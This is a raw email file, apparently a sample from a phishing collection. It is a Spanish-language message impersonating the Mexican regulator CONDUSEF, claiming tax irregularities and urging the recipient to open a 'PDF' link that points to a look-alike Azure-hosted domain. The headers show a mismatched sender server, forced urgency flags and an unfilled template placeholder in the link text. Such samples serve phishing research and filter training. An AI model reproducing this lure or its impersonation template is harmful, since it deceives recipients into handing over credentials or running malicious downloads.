@@ -1,0 +1,104 @@
+From jose@monkey.org Tue Dec 19 15:16:56 2023 +0000
+Return-Path: root@pcesehto.lindeabs.com
+Delivered-To: jose@monkey.org
+X-FDA: 81583920432.15.2B2E2FB
+Received: from pcesehto.lindeabs.com (pcesehto.lindeabs.com [128.199.148.238])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id 10D79120011
+	for <jose@monkey.org>; Tue, 19 Dec 2023 15:16:53 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=oficial.com header.s=mail header.b=VhBvE2RD;
+	dmarc=none;
+	spf=pass (imf18.b.hostedemail.com: domain of root@pcesehto.lindeabs.com designates 128.199.148.238 as permitted sender) smtp.mailfrom=root@pcesehto.lindeabs.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1702999014;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=C6dq/cmP/7TyDD27WPBUxSeFf0Xn5xfbr4B7VGhqhJo=;
+	b=YEuC5n3g5CFrHR0HC+M9kN6sKLZ6ZS9Bn7dkqdTiBtqMNXrX1Ia0nFpyv59B1BJnRcyjSS
+	XIIowwDTJ8/NMqWImOG+c79n6DtexkIg0mz3bDCkQPnPTDAk2+yfYT1g0A3F9BVsWvCf68
+	2XdgilNxbqBaJIH/5TiL7/QPCULizCI=
+ARC-Authentication-Results: i=1;
+	imf18.b.hostedemail.com;
+	dkim=none ("invalid DKIM record") header.d=oficial.com header.s=mail header.b=VhBvE2RD;
+	dmarc=none;
+	spf=pass (imf18.b.hostedemail.com: domain of root@pcesehto.lindeabs.com designates 128.199.148.238 as permitted sender) smtp.mailfrom=root@pcesehto.lindeabs.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1702999014; a=rsa-sha256;
+	cv=none;
+	b=res9jJ11Z3aq8HWWFxHz078ljD3vxdVEe7ksorrDWyBY+vom/d/B7EfvSXXtjrSqRtg+Tk
+	vbwdNazv6y4ANfZly218nWFrhYFCubQz9v021+SFekRdbNA0EwAbepqsimG38MbwDmn5SG
+	htmQ9auQ+kOV/iIVzYeel5w1zK24Djg=
+Received: by pcesehto.lindeabs.com (Postfix, from userid 0)
+	id EC362431BC; Tue, 19 Dec 2023 15:06:03 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oficial.com; s=mail;
+	t=1702998874; bh=C6dq/cmP/7TyDD27WPBUxSeFf0Xn5xfbr4B7VGhqhJo=;
+	h=Subject:From:To:Date;
+	b=VhBvE2RDNy4oG9yYsQSa89ceeDjn9fnNfSnAV3BFlhFcBUq6+trPibDRRIgVCiZ8r
+	 V+Zu8KWH9ZAdI0Fylf0m6kW0AmMF8Ygrfu+wFssleLTYzuuRVb0O9D9HfFUBbXgiiq
+	 5v6oKvKT/Thilj2CWFvc9Cn/8g9E89s3Oe3ZbTq3Vlv/otprZCbtDjeSCRAHsQ6iH5
+	 mk1Ra1WZT5aPuJpj2nEOcFKLFA2Vs1u5BL56CqRJp2kDd1n/RWzZ1VnLDHIT8WJpJR
+	 xLV7C+ylC1N04XyxbVTakbXLmjAqbsGb1gY7JXbfGivn7O05Jyk8cmPlGKvWX45V1c
+	 ckr32t4KcEtMg==
+content-type: text/html
+Subject: Portal de Queja Electronica ID57738536
+MIME-Version: 1.0
+X-Priority: 1
+X-MSmail-Priority: High
+Priority: urgent
+Importance: high
+X-Mailer: Microsoft Office Outlook, Build 11.0.5510
+X-Newsreader: Microsoft Outlook Express 6.00.2800.140
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441
+Message-ID: <n1rKAA0Gp5IuRd5irc0ek7Eo8CrnJ9AcX@oficial.com>
+From: Convocatoria para Revision Fiscal<asesoria@oficial.com>
+To: jose@monkey.org
+Date: Tue, 19 Dec 2023 15:06:03 +0000 (UTC)
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 10D79120011
+X-Stat-Signature: wwqt5m4w5ssur44if6tuypsgn1hc558f
+X-Rspam-User: 
+X-Spam-Status: No, score=-0.66
+X-HE-Tag: 1702999013-384588
+X-HE-Meta: U2FsdGVkX1/IyKW/EMKNpIFd9h/UJI8k8YPMVaQoeVSq3+OPaYn+kyB0i+09BEV/Nmq4dP0/B04lwrAfK8qZCbDi4nnu6ZPv7g8WCktJ+8FDjEPGMoZyU6r3+x9Ve5ThrqJ7t/m24Wr6VeHrBLkOmw5ErHtdLkrM52cXGeaoKn8TT+UJYXeqTWMgapHSqx7sYKfmdsKkAwrJX/+iC85S0524jYHO4WNiVWu2FEjoKerlBHPbwUfDxzsL+hWYhALB8FrrlZR3PTPN/1ZOXcC7blTbA33IdOOd
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 406
+
+<div class="container">
+
+<h2><img src="https://www.acsan.mx/wp-content/uploads/2022/10/Comision-Nacional-para-la-Proteccion-y-Defensa-de-los-Usuarios-de-Servicios-Financieros.jpg" alt="" width="507" height="317" /></h2>
+
+<p>Estimado(a) Cliente,</p>
+
+<p><strong>jose@monkey.org</strong></p>
+
+<p>Esperamos que este correo electr&oacute;nico le encuentre bien.</p>
+
+<p>Estamos en contacto para informarle sobre cuestiones relacionadas con las <strong>declaraciones de impuestos</strong> asociadas a su cuenta.</p>
+
+<div class="highlight">
+
+<p><strong>Convocatoria para An&aacute;lisis de Impuestos:</strong></p>
+
+<p>Hemos identificado posibles <strong>irregularidades en sus declaraciones de impuestos</strong>. <strong>Le solicitamos su presencia en nuestras oficinas de CONDUSEF para un an&aacute;lisis detallado de sus registros fiscales</strong>. Es fundamental revisar y corregir estas discrepancias lo m&aacute;s r&aacute;pido posible.</p>
+
+</div>
+
+<p><strong>Si es necesario, puede acceder al archivo PDF con los detalles del proceso haciendo clic en el siguiente enlace:</strong></p>
+
+<p><a href="https://condusfasesori.westus3.cloudapp.azure.com/?68242095_8976-210223210223=767813767813" rel="noopener">210223%random_2%.pdf (2095 KB)</a></p>
+
+<p>Estamos comprometidos a garantizar el cumplimiento de las leyes fiscales y trabajaremos en conjunto para resolver esta cuesti&oacute;n de la mejor manera posible.</p>
+
+<p><strong>Por favor, p&oacute;ngase en contacto con nosotros para programar un horario para el an&aacute;lisis o si necesita alguna asistencia adicional.</strong></p>
+
+<p>Agradecemos su cooperaci&oacute;n y comprensi&oacute;n.</p>
+
+<p>Atentamente,</p>
+
+<p><br />CONDUSEF</p>
+
+<p><img src="https://www.buro.gob.mx/img/bannerGrafica.jpg" alt="" width="508" height="174" /><img src="&nbsp;&nbsp;https://www.buro.gob.mx/img/bannerGrafica.jpg" alt="" />&nbsp;</p>
+
+&nbsp;</div>
